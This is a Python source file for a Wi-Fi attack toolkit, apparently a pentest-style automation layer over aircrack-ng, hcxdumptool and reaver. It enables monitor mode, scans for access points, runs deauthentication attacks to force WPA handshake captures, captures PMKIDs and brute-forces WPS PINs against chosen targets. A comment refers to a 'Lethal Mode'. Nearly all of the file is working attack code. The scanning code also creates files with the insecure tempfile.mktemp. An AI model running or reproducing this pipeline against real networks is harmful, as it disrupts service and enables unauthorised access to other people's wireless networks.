import subprocess
import time
import random
from typing import List, Dict, Optional
from core.logger import log
from core.knowledge_base import KnowledgeBase, NetworkTarget
from core.command_executor import CommandExecutor
from core.validation import InputValidator
from core.wrappers.hcx import HCXDumptoolWrapper
from core.wrappers.aircrack import AireplayWrapper
from core.wrappers.reaver import ReaverWrapper

class ToolSuite:
    def __init__(self):
        self.kb = KnowledgeBase()
        dry = self.kb.environment.dry_run
        self.executor = CommandExecutor()
        
        # Initialize sub-wrappers
        self.hcx = HCXDumptoolWrapper(dry_run=dry)
        self.air = AireplayWrapper(dry_run=dry)
        self.reaver = ReaverWrapper(dry_run=dry)

    def _run_command(self, cmd: List[str]) -> str:
        if self.kb.environment.dry_run:
            log.debug(f"[DRY-RUN] Executing: {' '.join(cmd)}")
            return ""
        
        success, stdout, stderr = self.executor.execute(cmd)
        if success:
            return stdout
        else:
            log.error(f"Command failed: {stderr}")
            return ""

    def list_interfaces(self) -> List[str]:
        """
        Returns a list of available wireless interfaces.
        """
        if self.kb.environment.dry_run:
            return ["wlan0", "wlan1", "wlan2"]
            
        try:
            success, stdout, stderr = self.executor.execute(["iw", "dev"])
            if not success:
                # Fallback if iw dev fails
                success, stdout, stderr = self.executor.execute(["ip", "-o", "link"])
                if not success:
                    return []
                    
            interfaces = []
            for line in stdout.split('\n'):
                if "wlan" in line:
                    parts = line.split(':')
                    if len(parts) >= 2:
                        iface = parts[1].strip()
                        if InputValidator.validate_interface_name(iface):
                            interfaces.append(iface)
            
            return sorted(list(set(interfaces)))
        except Exception as e:
            log.error(f"Failed to list interfaces: {e}")
            return []

    def enable_monitor_mode(self, interface: str) -> str:
        if not InputValidator.validate_interface_name(interface):
            log.error(f"Invalid interface name: {interface}")
            return ""
            
        log.info(f"Enabling monitor mode on {interface}...")
        if self.kb.environment.dry_run:
            self.kb.environment.mon_interface = f"{interface}mon"
            return f"{interface}mon"
        
        try:
            # Kill processes that might interfere with monitor mode
            self.executor.execute(["airmon-ng", "check", "kill"])
            
            # Start monitor mode
            success, stdout, stderr = self.executor.execute(["airmon-ng", "start", interface])
            
            # Determine the monitor interface name
            # Usually it's interface + "mon", but we can check to be sure
            mon_interface = f"{interface}mon"
            
            # Verify the interface was created
            success, stdout, stderr = self.executor.execute(["iw", "dev"])
            if success:
                for line in stdout.split('\n'):
                    if "Interface" in line and interface in line and "mon" in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            mon_interface = parts[1]
                            break
            
            # Additional verification that the interface is actually in monitor mode
            try:
                success, mode_stdout, mode_stderr = self.executor.execute(["iw", "dev", mon_interface, "info"])
                if success and "type monitor" in mode_stdout:
                    log.info(f"Monitor mode successfully enabled on {mon_interface}")
                else:
                    log.warning(f"Interface {mon_interface} might not be in monitor mode")
            except:
                log.warning(f"Could not verify monitor mode on {mon_interface}")
            
            return mon_interface
        except Exception as e:
            log.error(f"Failed to enable monitor mode: {e}")
            return f"{interface}mon"  # Return a fallback name

    def scan_networks(self, interface: str, duration: int = 10) -> List[NetworkTarget]:
        if not InputValidator.validate_interface_name(interface):
            log.error(f"Invalid interface name: {interface}")
            return []
            
        # Basic scanning via airodump (mocked or real)
        # In Lethal Mode, we also scan for WPS now
        log.info(f"Scanning for networks (and WPS) on {interface} for {duration}s...")
        
        import tempfile
        import os
        import csv
        
        # Create temporary file for airodump-ng output
        temp_csv = tempfile.mktemp(suffix='.csv')
        temp_cap = temp_csv.replace('.csv', '.cap')
        
        # Run airodump-ng to scan for networks
        if not self.kb.environment.dry_run:
            try:
                # Start airodump-ng scan
                scan_cmd = [
                    "airodump-ng",
                    interface,
                    "--write", temp_csv[:-4],  # Without .csv extension
                    "--output-format", "csv",
                    "--uptime",
                    "--channel", "1-11",  # Scan common channels
                    "--timeout", str(duration)  # Set timeout
                ]
                
                success, stdout, stderr = self.executor.execute(scan_cmd)
                
                # Parse the CSV output from airodump-ng
                targets = []
                if os.path.exists(temp_csv):
                    with open(temp_csv, 'r') as f:
                        content = f.read()
                        
                        # Find the section with AP data
                        lines = content.split('\n')
                        ap_section = False
                        for line in lines:
                            if 'BSSID' in line and 'First time seen' in line:
                                ap_section = True
                                continue
                            
                            if ap_section:
                                if line.strip() == '' or 'Station MAC' in line:
                                    ap_section = False
                                    continue
                                
                                # Parse AP data
                                # Format: BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key
                                fields = []
                                current_field = ""
                                in_quotes = False
                                
                                # Manual CSV parsing due to potential commas in SSID names
                                for char in line:
                                    if char == '"' and not in_quotes:
                                        in_quotes = True
                                    elif char == '"' and in_quotes:
                                        in_quotes = False
                                    elif char == ',' and not in_quotes:
                                        fields.append(current_field.strip())
                                        current_field = ""
                                    else:
                                        current_field += char
                                fields.append(current_field.strip())
                                
                                if len(fields) >= 15:
                                    bssid = fields[0].strip()
                                    ssid = fields[13].strip().strip('"')
                                    channel = int(fields[3].strip()) if fields[3].strip().isdigit() else 1
                                    encryption = fields[5].strip()
                                    signal_strength = int(fields[8].strip()) if fields[8].strip().lstrip('-').isdigit() else -80
                                    
                                    if bssid != "00:00:00:00:00:00" and ssid:  # Valid AP
                                        target = NetworkTarget(
                                            bssid=bssid,
                                            ssid=ssid,
                                            channel=channel,
                                            encryption=encryption,
                                            signal_strength=signal_strength
                                        )
                                        targets.append(target)
                
            except Exception as e:
                log.error(f"Airodump-ng scan failed: {e}")
                targets = []
            
            # Clean up temporary files
            try:
                if os.path.exists(temp_csv):
                    os.remove(temp_csv)
                temp_files = [temp_csv.replace('.csv', ext) for ext in ['.cap', '-01.csv', '-01.cap']]
                for temp_file in temp_files:
                    if os.path.exists(temp_file):
                        os.remove(temp_file)
            except:
                pass  # Don't worry about cleanup errors
        
        else:
            # Dry run - keep original mock data
            time.sleep(1) # Simulate work
            t1 = NetworkTarget(
                bssid="00:11:22:33:44:55", 
                ssid="Corp_WiFi", 
                channel=6, 
                encryption="WPA2", 
                signal_strength=-50,
                wps_enabled=True,
                wps_locked=False
            )
            t2 = NetworkTarget(
                bssid="AA:BB:CC:DD:EE:FF", 
                ssid="Free_Guest", 
                channel=1, 
                encryption="OPEN", 
                signal_strength=-70
            )
            targets = [t1, t2]

        # 2. Run WPS scan (wash) and overlay data
        wps_data = self.reaver.scan_wps(interface)
        for t in targets:
            if t.bssid in wps_data:
                t.wps_enabled = True
                t.wps_locked = wps_data[t.bssid]["locked"]
                t.wps_version = wps_data[t.bssid]["version"]
                
        return targets

    def capture_handshake(self, interface: str, target: NetworkTarget, duration: int = 30) -> bool:
        if not InputValidator.validate_interface_name(interface) or not InputValidator.validate_mac_address(target.bssid):
            log.error(f"Invalid interface or MAC address: {interface}, {target.bssid}")
            return False
            
        # Classic Deauth + Capture
        log.info(f"Initiating Handshake Capture on {target.ssid}...")
        
        import tempfile
        import os
        
        # Create temporary file for airodump-ng capture
        temp_pcap = tempfile.mktemp(suffix='.cap')
        
        # Start airodump-ng in background to capture the handshake
        dump_cmd = [
            "airodump-ng",
            "-c", str(target.channel),  # Set to target's channel
            "--bssid", target.bssid,    # Filter for our target
            "-w", temp_pcap[:-4],       # Write to file (without .cap extension)
            "--output-format", "pcap",
            interface
        ]
        
        # Start airodump-ng in a separate process
        import subprocess
        dump_process = subprocess.Popen(
            dump_cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        # Wait a moment for airodump to initialize
        time.sleep(2)
        
        # Run deauth attack to force clients to reconnect
        self.air.deauth(interface, target.bssid)
        
        # Wait for potential handshake capture
        time.sleep(duration)
        
        # Stop airodump-ng
        dump_process.terminate()
        try:
            dump_process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            dump_process.kill()
        
        # Check if handshake was captured by checking the file
        pcap_file = temp_pcap[:-4] + "-01.cap"  # airodump-ng naming convention
        handshake_found = False
        
        if os.path.exists(pcap_file):
            # Use airdecap-ng to test if there's a valid handshake
            success, stdout, stderr = self.executor.execute(["airdecap-ng", "-b", target.bssid, pcap_file])
            
            # Check output for successful handshake detection
            if "Handshakes" in stdout:
                handshake_found = True
                target.handshake_captured = True
            else:
                # Alternative check: use tshark to look for EAPOL packets
                tshark_cmd = [
                    "tshark",
                    "-r", pcap_file,
                    "-Y", f"eapol && wlan.sa=={target.bssid}",
                    "-T", "fields",
                    "-e", "frame.time"
                ]
                success, tshark_stdout, tshark_stderr = self.executor.execute(tshark_cmd)
                if success and len(tshark_stdout.strip()) > 0:
                    handshake_found = True
                    target.handshake_captured = True
        
        # Cleanup temporary files
        try:
            if os.path.exists(pcap_file):
                os.remove(pcap_file)
            # Remove other airodump-ng files that might have been created
            possible_files = [f"{temp_pcap[:-4]}-{i:02d}.cap" for i in range(1, 10)]
            for f in possible_files:
                if os.path.exists(f):
                    os.remove(f)
        except:
            pass  # Don't worry about cleanup errors
        
        return handshake_found
        
    def capture_pmkid(self, interface: str, target: NetworkTarget) -> bool:
        if not InputValidator.validate_interface_name(interface) or not InputValidator.validate_mac_address(target.bssid):
            log.error(f"Invalid interface or MAC address: {interface}, {target.bssid}")
            return False
            
        success = self.hcx.capture_pmkid(interface, target.bssid)
        if success:
            target.pmkid_captured = True
        return success
        
    def attack_wps(self, interface: str, target: NetworkTarget) -> bool:
        if not InputValidator.validate_interface_name(interface) or not InputValidator.validate_mac_address(target.bssid):
            log.error(f"Invalid interface or MAC address: {interface}, {target.bssid}")
            return False
            
        pin = self.reaver.attack_wps(interface, target.bssid)
        if pin:
            target.wps_pin = pin
            return True
        return False
